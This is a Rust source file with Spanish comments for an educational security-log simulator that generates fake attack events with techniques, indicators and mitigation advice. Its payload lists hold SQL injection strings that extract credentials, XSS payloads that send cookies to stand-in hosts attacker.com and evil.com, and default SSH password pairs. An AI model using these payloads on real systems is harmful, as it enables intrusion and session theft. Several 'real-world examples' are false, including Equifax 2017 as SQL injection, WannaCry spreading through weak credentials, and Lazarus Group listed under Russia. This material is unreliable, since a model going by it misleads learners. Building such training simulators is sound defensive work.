use std::collections::HashMap;
use chrono::{DateTime, Utc};
use serde::{Deserialize, Serialize};
use uuid::Uuid;
use crate::{LogEvent, Severity, EventType};

/// Patrón de ataque realista para simulación educativa
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct AttackPattern {
    pub id: String,
    pub name: String,
    pub description: String,
    pub attack_type: String,
    pub severity: Severity,
    pub origin_country: String,
    pub tactics: Vec<String>,
    pub techniques: Vec<String>,
    pub payloads: Vec<String>,
    pub indicators: Vec<String>,
    pub mitigation_steps: Vec<String>,
    pub educational_notes: Vec<String>,
}

/// Métricas de sistema base para simulación
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct SystemMetrics {
    pub baseline_events_per_hour: u32,
    pub normal_error_rate: f64,
    pub peak_hours: Vec<u8>,
    pub typical_sources: Vec<String>,
    pub normal_user_agents: Vec<String>,
    pub geographic_distribution: HashMap<String, f64>,
}

/// Mapa de distribución geográfica de amenazas
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct GeoThreatMap {
    pub threat_origins: HashMap<String, ThreatOriginInfo>,
    pub high_risk_countries: Vec<String>,
    pub threat_intelligence: HashMap<String, Vec<String>>,
}

/// Información de origen de amenazas por país/región
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct ThreatOriginInfo {
    pub country_name: String,
    pub country_code: String,
    pub threat_level: String,
    pub common_attacks: Vec<String>,
    pub known_groups: Vec<String>,
    pub ips_ranges: Vec<String>,
}

/// Simulador realista para fines educativos
pub struct RealisticSimulator {
    pub patterns: Vec<AttackPattern>,
    pub baseline_metrics: SystemMetrics,
    pub geo_distribution: GeoThreatMap,
    current_scenario: Option<String>,
    event_counter: u64,
}

impl RealisticSimulator {
    /// Crea un nuevo simulador con patrones realistas precargados
    pub fn new() -> Self {
        let patterns = Self::load_realistic_attack_patterns();
        let baseline_metrics = Self::create_baseline_metrics();
        let geo_distribution = Self::create_geo_threat_map();
        
        Self {
            patterns,
            baseline_metrics,
            geo_distribution,
            current_scenario: None,
            event_counter: 0,
        }
    }

    /// Genera un evento de log realista basado en escenarios reales
    pub fn generate_realistic_event(&mut self) -> LogEvent {
        self.event_counter += 1;
        
        // Seleccionar patrón de ataque de manera ponderada
        let pattern = self.select_weighted_attack_pattern();
        
        // Generar IP de origen realista basada en geografía
        let source_ip = self.generate_realistic_source_ip(&pattern);
        
        // Crear evento basado en el patrón seleccionado
        let event = LogEvent {
            id: Uuid::new_v4(),
            timestamp: Utc::now(),
            severity: pattern.severity.clone(),
            source: self.select_realistic_source(&pattern),
            event_type: self.map_attack_type_to_event_type(&pattern.attack_type),
            source_ip: Some(source_ip),
            raw_message: self.generate_realistic_log_message(&pattern),
            parsed_data: self.generate_realistic_parsed_data(&pattern),
            iocs: pattern.indicators.clone(),
        };

        event
    }

    /// Carga patrones de ataque realistas basados en amenazas conocidas
    fn load_realistic_attack_patterns() -> Vec<AttackPattern> {
        vec![
            // SQL Injection Patterns
            AttackPattern {
                id: "sql_injection_union".to_string(),
                name: "SQL Injection - Ataque UNION".to_string(),
                description: "Intento de extracción de datos mediante UNION SELECT".to_string(),
                attack_type: "sql_injection".to_string(),
                severity: Severity::Critical,
                origin_country: "Various".to_string(),
                tactics: vec!["Initial Access".to_string(), "Exfiltration".to_string()],
                techniques: vec!["T1190 - Exploit Public-Facing Application".to_string()],
                payloads: vec![
                    "' UNION SELECT username,password FROM users--".to_string(),
                    "1' OR '1'='1' UNION SELECT user(),database(),version()--".to_string(),
                    "' UNION ALL SELECT CONCAT(username,':',password) FROM admin--".to_string()
                ],
                indicators: vec![
                    "UNION keyword en parámetros".to_string(),
                    "Comentarios SQL (--) en query".to_string(),
                    "Múltiples columnas en SELECT".to_string()
                ],
                mitigation_steps: vec![
                    "Implementar prepared statements".to_string(),
                    "Validar y sanitizar entrada de usuario".to_string(),
                    "Aplicar principio de menor privilegio en DB".to_string()
                ],
                educational_notes: vec![
                    "UNION SELECT permite combinar resultados de múltiples consultas".to_string(),
                    "Los atacantes buscan extraer datos sensibles como usuarios y contraseñas".to_string(),
                    "El uso de comentarios (--) permite ignorar el resto de la consulta original".to_string()
                ],
            },
            
            // XSS Patterns
            AttackPattern {
                id: "xss_reflected".to_string(),
                name: "XSS Reflejado - Inyección de Scripts".to_string(),
                description: "Cross-Site Scripting reflejado para robo de cookies".to_string(),
                attack_type: "xss".to_string(),
                severity: Severity::High,
                origin_country: "Global".to_string(),
                tactics: vec!["Execution".to_string(), "Credential Access".to_string()],
                techniques: vec!["T1059 - Command and Scripting Interpreter".to_string()],
                payloads: vec![
                    "<script>document.location='http://attacker.com/steal.php?cookie='+document.cookie</script>".to_string(),
                    "<img src=x onerror=fetch('http://evil.com?'+document.cookie)>".to_string(),
                    "<svg onload=alert('XSS')></svg>".to_string()
                ],
                indicators: vec![
                    "Tags HTML maliciosos en parámetros".to_string(),
                    "JavaScript ejecutándose en contexto no esperado".to_string(),
                    "Llamadas a dominios externos sospechosos".to_string()
                ],
                mitigation_steps: vec![
                    "Escapar output en todas las plantillas".to_string(),
                    "Implementar Content Security Policy (CSP)".to_string(),
                    "Validar y filtrar entrada de usuario".to_string()
                ],
                educational_notes: vec![
                    "XSS reflejado ocurre cuando la entrada maliciosa se devuelve inmediatamente".to_string(),
                    "Los atacantes buscan robar cookies de sesión o credenciales".to_string(),
                    "document.cookie expone todas las cookies del dominio actual".to_string()
                ],
            },

            // Brute Force Patterns
            AttackPattern {
                id: "brute_force_ssh".to_string(),
                name: "Fuerza Bruta SSH - Credenciales Débiles".to_string(),
                description: "Ataque automatizado contra servicios SSH con diccionarios".to_string(),
                attack_type: "brute_force".to_string(),
                severity: Severity::Warning,
                origin_country: "China".to_string(),
                tactics: vec!["Credential Access".to_string(), "Initial Access".to_string()],
                techniques: vec!["T1110 - Brute Force".to_string(), "T1078 - Valid Accounts".to_string()],
                payloads: vec![
                    "admin:admin".to_string(),
                    "root:123456".to_string(),
                    "user:password".to_string(),
                    "administrator:admin123".to_string()
                ],
                indicators: vec![
                    "Múltiples intentos de login fallidos".to_string(),
                    "Patrones secuenciales de nombres de usuario".to_string(),
                    "Conexiones desde IPs sospechosas".to_string()
                ],
                mitigation_steps: vec![
                    "Implementar autenticación multifactor (MFA)".to_string(),
                    "Configurar fail2ban o rate limiting".to_string(),
                    "Deshabilitar login por contraseña, usar llaves SSH".to_string()
                ],
                educational_notes: vec![
                    "Los atacantes usan listas de contraseñas comunes".to_string(),
                    "SSH es un objetivo común por ser un servicio crítico".to_string(),
                    "Los botnets automatizan estos ataques a gran escala".to_string()
                ],
            },

            // Anomaly Detection Pattern
            AttackPattern {
                id: "anomaly_data_exfiltration".to_string(),
                name: "Anomalía - Exfiltración de Datos".to_string(),
                description: "Comportamiento anómalo indicativo de exfiltración masiva".to_string(),
                attack_type: "anomaly".to_string(),
                severity: Severity::Critical,
                origin_country: "Russia".to_string(),
                tactics: vec!["Collection".to_string(), "Exfiltration".to_string()],
                techniques: vec!["T1005 - Data from Local System".to_string(), "T1041 - Exfiltration Over C2 Channel".to_string()],
                payloads: vec![
                    "Transferencias de archivos grandes fuera de horario".to_string(),
                    "Acceso masivo a bases de datos".to_string(),
                    "Compresión y cifrado de archivos sensibles".to_string()
                ],
                indicators: vec![
                    "Volumen de datos inusualmente alto".to_string(),
                    "Actividad fuera de horarios normales".to_string(),
                    "Acceso a múltiples sistemas sensibles".to_string()
                ],
                mitigation_steps: vec![
                    "Aislar sistemas comprometidos inmediatamente".to_string(),
                    "Revisar logs de acceso a datos sensibles".to_string(),
                    "Implementar DLP (Data Loss Prevention)".to_string()
                ],
                educational_notes: vec![
                    "La exfiltración suele ocurrir durante horarios de baja actividad".to_string(),
                    "Los atacantes comprimen datos para reducir la detección".to_string(),
                    "ML puede detectar patrones anómalos de acceso a datos".to_string()
                ],
            },
        ]
    }

    /// Selecciona un patrón de ataque basado en probabilidades realistas
    fn select_weighted_attack_pattern(&self) -> &AttackPattern {
        use rand::Rng;
        let mut rng = rand::thread_rng();
        let weights = vec![30, 25, 35, 10]; // SQL, XSS, Brute Force, Anomaly
        let total_weight: u32 = weights.iter().sum();
        let random_weight = rng.gen_range(0..total_weight);
        
        let mut cumulative = 0;
        for (i, weight) in weights.iter().enumerate() {
            cumulative += weight;
            if random_weight < cumulative {
                return &self.patterns[i];
            }
        }
        &self.patterns[0]
    }

    /// Genera IP de origen realista basada en distribución geográfica
    fn generate_realistic_source_ip(&self, pattern: &AttackPattern) -> String {
        use rand::Rng;
        let mut rng = rand::thread_rng();
        
        match pattern.origin_country.as_str() {
            "China" => format!("{}.{}.{}.{}", 
                rng.gen_range(1..223), rng.gen_range(0..255), 
                rng.gen_range(0..255), rng.gen_range(1..254)),
            "Russia" => format!("{}.{}.{}.{}", 
                rng.gen_range(46..95), rng.gen_range(0..255), 
                rng.gen_range(0..255), rng.gen_range(1..254)),
            "Various" => format!("{}.{}.{}.{}", 
                rng.gen_range(10..200), rng.gen_range(0..255), 
                rng.gen_range(0..255), rng.gen_range(1..254)),
            _ => format!("192.168.{}.{}", rng.gen_range(1..255), rng.gen_range(1..254)),
        }
    }

    /// Selecciona una fuente realista (Apache, Nginx, SSH, etc.)
    fn select_realistic_source(&self, pattern: &AttackPattern) -> String {
        match pattern.attack_type.as_str() {
            "sql_injection" | "xss" => "Apache/2.4.41".to_string(),
            "brute_force" => "OpenSSH_8.3".to_string(),
            "anomaly" => "Application-Server".to_string(),
            _ => "Generic-Source".to_string(),
        }
    }

    /// Mapea tipos de ataque a EventType
    fn map_attack_type_to_event_type(&self, attack_type: &str) -> EventType {
        match attack_type {
            "sql_injection" => EventType::SqlInjection,
            "xss" => EventType::XssAttempt,
            "brute_force" => EventType::BruteForce,
            "anomaly" => EventType::Anomaly,
            _ => EventType::SuspiciousActivity,
        }
    }

    /// Genera mensaje de log realista
    fn generate_realistic_log_message(&self, pattern: &AttackPattern) -> String {
        use rand::Rng;
        let mut rng = rand::thread_rng();
        
        match pattern.attack_type.as_str() {
            "sql_injection" => {
                let payload = &pattern.payloads[rng.gen_range(0..pattern.payloads.len())];
                format!("POST /login.php HTTP/1.1 - Payload detectado: {}", payload)
            },
            "xss" => {
                let payload = &pattern.payloads[rng.gen_range(0..pattern.payloads.len())];
                format!("GET /search?q={} HTTP/1.1 - Script malicioso detectado", payload)
            },
            "brute_force" => {
                let credential = &pattern.payloads[rng.gen_range(0..pattern.payloads.len())];
                format!("SSH: Failed login attempt with credentials: {}", credential)
            },
            "anomaly" => {
                format!("ANOMALY: {} - Comportamiento inusual detectado", pattern.description)
            },
            _ => format!("Security Event: {}", pattern.description),
        }
    }

    /// Genera datos parseados realistas
    fn generate_realistic_parsed_data(&self, pattern: &AttackPattern) -> serde_json::Value {
        serde_json::json!({
            "attack_pattern": pattern.name,
            "origin_country": pattern.origin_country,
            "tactics": pattern.tactics,
            "techniques": pattern.techniques,
            "educational_context": {
                "description": pattern.description,
                "mitigation_steps": pattern.mitigation_steps,
                "educational_notes": pattern.educational_notes
            },
            "threat_intelligence": {
                "attack_id": pattern.id,
                "severity_explanation": self.get_severity_explanation(&pattern.severity),
                "real_world_examples": self.get_real_world_examples(&pattern.attack_type)
            }
        })
    }

    /// Explicación educativa del nivel de severidad
    fn get_severity_explanation(&self, severity: &Severity) -> String {
        match severity {
            Severity::Critical => "Amenaza crítica que requiere respuesta inmediata. Puede causar compromiso total del sistema.".to_string(),
            Severity::High => "Amenaza alta con potencial de causar daño significativo. Requiere investigación prioritaria.".to_string(),
            Severity::Warning => "Actividad sospechosa que requiere monitoreo. Posible indicador de ataque.".to_string(),
            Severity::Medium => "Evento de seguridad que requiere revisión durante horario laboral.".to_string(),
            Severity::Info => "Evento informativo para contexto de seguridad.".to_string(),
            Severity::Low => "Evento de baja prioridad, útil para análisis de tendencias.".to_string(),
        }
    }

    /// Ejemplos del mundo real por tipo de ataque
    fn get_real_world_examples(&self, attack_type: &str) -> Vec<String> {
        match attack_type {
            "sql_injection" => vec![
                "Equifax 2017: SQL injection expuso datos de 147 millones de personas".to_string(),
                "Sony Pictures 2011: Compromiso masivo vía inyección SQL".to_string(),
                "TalkTalk 2015: Pérdida de datos de clientes por vulnerabilidad SQL".to_string()
            ],
            "xss" => vec![
                "Twitter 2010: Gusano XSS se propagó automáticamente".to_string(),
                "MySpace 2005: Samy worm infectó un millón de perfiles".to_string(),
                "Yahoo 2013: XSS utilizado para phishing masivo".to_string()
            ],
            "brute_force" => vec![
                "Botnets Mirai: Ataques masivos contra dispositivos IoT".to_string(),
                "Carbanak: Fuerza bruta en cajeros automáticos".to_string(),
                "WannaCry: Aprovechó credenciales débiles para propagarse".to_string()
            ],
            "anomaly" => vec![
                "APT29 (Cozy Bear): Actividad anómala prolongada en redes gubernamentales".to_string(),
                "Stuxnet: Comportamiento anómalo en sistemas industriales".to_string(),
                "SolarWinds: Tráfico de red anómalo reveló el compromiso".to_string()
            ],
            _ => vec!["Consulte bases de datos de amenazas como MITRE ATT&CK".to_string()],
        }
    }

    /// Crea métricas base del sistema
    fn create_baseline_metrics() -> SystemMetrics {
        SystemMetrics {
            baseline_events_per_hour: 1200,
            normal_error_rate: 0.02,
            peak_hours: vec![9, 10, 11, 14, 15, 16],
            typical_sources: vec![
                "Apache/2.4.41".to_string(),
                "Nginx/1.18.0".to_string(),
                "OpenSSH_8.3".to_string(),
                "MySQL/8.0".to_string()
            ],
            normal_user_agents: vec![
                "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36".to_string(),
                "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36".to_string(),
                "curl/7.68.0".to_string()
            ],
            geographic_distribution: HashMap::from([
                ("US".to_string(), 35.0),
                ("EU".to_string(), 25.0),
                ("APAC".to_string(), 20.0),
                ("LATAM".to_string(), 15.0),
                ("Other".to_string(), 5.0),
            ]),
        }
    }

    /// Crea mapa de distribución de amenazas por geografía
    fn create_geo_threat_map() -> GeoThreatMap {
        let mut threat_origins = HashMap::new();
        
        threat_origins.insert("CN".to_string(), ThreatOriginInfo {
            country_name: "China".to_string(),
            country_code: "CN".to_string(),
            threat_level: "High".to_string(),
            common_attacks: vec!["Brute Force".to_string(), "APT".to_string(), "Espionage".to_string()],
            known_groups: vec!["APT1".to_string(), "APT40".to_string(), "Winnti Group".to_string()],
            ips_ranges: vec!["1.0.0.0/8".to_string(), "27.0.0.0/8".to_string()],
        });

        threat_origins.insert("RU".to_string(), ThreatOriginInfo {
            country_name: "Russia".to_string(),
            country_code: "RU".to_string(),
            threat_level: "High".to_string(),
            common_attacks: vec!["Ransomware".to_string(), "Banking Trojans".to_string(), "APT".to_string()],
            known_groups: vec!["APT28".to_string(), "APT29".to_string(), "Lazarus Group".to_string()],
            ips_ranges: vec!["46.0.0.0/8".to_string(), "95.0.0.0/8".to_string()],
        });

        threat_origins.insert("KP".to_string(), ThreatOriginInfo {
            country_name: "North Korea".to_string(),
            country_code: "KP".to_string(),
            threat_level: "High".to_string(),
            common_attacks: vec!["Cryptocurrency Theft".to_string(), "Ransomware".to_string(), "Banking".to_string()],
            known_groups: vec!["Lazarus Group".to_string(), "APT38".to_string()],
            ips_ranges: vec!["175.45.176.0/22".to_string()],
        });

        GeoThreatMap {
            threat_origins,
            high_risk_countries: vec!["CN".to_string(), "RU".to_string(), "KP".to_string(), "IR".to_string()],
            threat_intelligence: HashMap::from([
                ("APT".to_string(), vec!["Persistent access".to_string(), "Data theft".to_string(), "Espionage".to_string()]),
                ("Ransomware".to_string(), vec!["File encryption".to_string(), "Payment demands".to_string(), "Business disruption".to_string()]),
                ("Botnet".to_string(), vec!["DDoS attacks".to_string(), "Spam distribution".to_string(), "Cryptocurrency mining".to_string()]),
            ]),
        }
    }

    /// Inicia un escenario educativo específico
    pub fn start_educational_scenario(&mut self, scenario_name: &str) {
        self.current_scenario = Some(scenario_name.to_string());
        info!("Iniciando escenario educativo: {}", scenario_name);
    }

    /// Obtiene información educativa sobre el escenario actual
    pub fn get_current_scenario_info(&self) -> Option<serde_json::Value> {
        self.current_scenario.as_ref().map(|scenario| {
            serde_json::json!({
                "scenario_name": scenario,
                "description": self.get_scenario_description(scenario),
                "learning_objectives": self.get_learning_objectives(scenario),
                "key_indicators": self.get_key_indicators(scenario)
            })
        })
    }

    fn get_scenario_description(&self, scenario: &str) -> String {
        match scenario {
            "web_application_attack" => "Simulación de ataque completo contra aplicación web con múltiples vectores".to_string(),
            "insider_threat" => "Comportamiento malicioso de usuario interno con acceso legítimo".to_string(),
            "apt_campaign" => "Campaña APT (Advanced Persistent Threat) sofisticada y prolongada".to_string(),
            _ => "Escenario de seguridad general".to_string(),
        }
    }

    fn get_learning_objectives(&self, scenario: &str) -> Vec<String> {
        match scenario {
            "web_application_attack" => vec![
                "Identificar patrones de ataque web comunes".to_string(),
                "Correlacionar múltiples eventos maliciosos".to_string(),
                "Implementar defensas en profundidad".to_string()
            ],
            "insider_threat" => vec![
                "Detectar comportamiento anómalo de usuarios".to_string(),
                "Analizar patrones de acceso a datos sensibles".to_string(),
                "Establecer controles de acceso granulares".to_string()
            ],
            "apt_campaign" => vec![
                "Reconocer técnicas de persistencia avanzada".to_string(),
                "Implementar threat hunting proactivo".to_string(),
                "Correlacionar eventos a lo largo del tiempo".to_string()
            ],
            _ => vec!["Objetivos de aprendizaje general".to_string()],
        }
    }

    fn get_key_indicators(&self, scenario: &str) -> Vec<String> {
        match scenario {
            "web_application_attack" => vec![
                "Múltiples tipos de payload en corto tiempo".to_string(),
                "Escaneo de directorios y archivos".to_string(),
                "Intentos de bypass de autenticación".to_string()
            ],
            "insider_threat" => vec![
                "Acceso fuera de horario laboral".to_string(),
                "Descarga masiva de documentos".to_string(),
                "Acceso a sistemas no relacionados con el rol".to_string()
            ],
            "apt_campaign" => vec![
                "Comunicación con C2 servers".to_string(),
                "Movimiento lateral en la red".to_string(),
                "Técnicas de evasión avanzadas".to_string()
            ],
            _ => vec!["Indicadores generales de compromiso".to_string()],
        }
    }
}

impl Default for RealisticSimulator {
    fn default() -> Self {
        Self::new()
    }
}